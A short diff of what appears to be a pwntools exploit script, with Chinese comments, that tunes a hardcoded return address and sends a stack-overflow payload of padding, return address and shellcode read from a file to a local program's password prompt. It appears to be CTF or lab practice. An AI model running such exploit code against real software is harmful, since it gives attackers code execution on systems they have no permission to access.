@@ -14,11 +14,12 @@ p = process(binary)
 # 接收程序输出
 print(p.recvuntil(b'Enter password:'))
 
-retaddr=0xffffd000#0xffffcfa0
+retaddr=0xffffcfe0#0xffffd000#0xffffcfa0
 #shellcode=asm(shellcraft.linux.sh())
 shellcode=open('codeinjection.bin','rb').read()[206:]
+print(shellcode)
 payload=b'A'*24 + p32(retaddr) + shellcode
-
+print(payload)
 # 发送输入给程序
 p.sendline(payload)
 
